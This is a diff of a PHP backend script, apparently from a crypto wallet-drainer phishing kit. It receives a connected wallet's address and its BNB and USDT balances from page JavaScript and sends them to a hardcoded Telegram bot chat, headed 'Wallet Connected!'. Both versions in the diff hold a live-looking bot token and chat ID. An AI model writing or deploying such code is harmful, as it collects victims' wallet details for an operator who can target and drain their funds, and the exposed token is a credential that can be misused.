@@ -1,34 +1,22 @@
 <?php
-// Telegram Bot Settings
-$botToken = '7536567492:AAHTGbJZXi2g7N_qY-AnpTBMZ6jHFYM42eM';
-$chatId = '8191508290';
+// Get JSON data sent from your JavaScript
+$data = json_decode(file_get_contents("php://input"), true);
 
-// Get JSON input
-$data = json_decode(file_get_contents('php://input'), true);
+// Fallback values to avoid errors
+$address = isset($data['address']) ? $data['address'] : 'Not Found';
+$bnb = isset($data['bnb']) ? $data['bnb'] : '0';
+$usdt = isset($data['usdt']) ? $data['usdt'] : '0';
 
-// Extract data
-$type = $data['type'] ?? 'unknown';
-$wallet = $data['wallet'] ?? 'Not Provided';
-$usdt = $data['usdt'] ?? 0;
-$bnb = $data['bnb'] ?? 0;
+// Your Telegram bot token and chat ID
+$token = '7536567492:AAHTGbJZXi2g7N_qY-AnpTBMZ6jHFYM42eM';
+$chat_id = '8191508290';
 
-// Format message
-$message = "🔔 *New Wallet Connected*\n"
-         . "👛 *Wallet:* `$wallet`\n"
-         . "💵 *USDT:* `$usdt`\n"
-         . "🪙 *BNB:* `$bnb`";
+// Prepare the message
+$message = "📥 *Wallet Connected!*\n\n"
+         . "👛 *Address:* `$address`\n"
+         . "💰 *BNB:* $bnb\n"
+         . "💸 *USDT:* $usdt";
 
-// Telegram API URL
-$url = "https://api.telegram.org/bot$botToken/sendMessage";
-
-// Send message
-$response = file_get_contents($url . '?' . http_build_query([
-    'chat_id' => $chatId,
-    'text' => $message,
-    'parse_mode' => 'Markdown'
-]));
-
-// Optional: Log to file for debugging
-file_put_contents("log.txt", json_encode($data));
-file_put_contents("telegram_response.txt", $response);
+// Send Telegram message using file_get_contents
+file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message) . "&parse_mode=Markdown");
 ?>
